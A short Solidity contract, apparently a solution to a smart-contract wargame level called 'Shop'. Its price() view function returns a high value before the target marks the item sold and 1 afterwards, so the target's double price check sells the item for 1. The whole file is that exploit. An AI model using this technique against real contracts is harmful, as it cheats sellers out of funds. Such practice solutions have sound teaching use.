
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {

    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 99999999999;
        }
        return 1;
    }
}

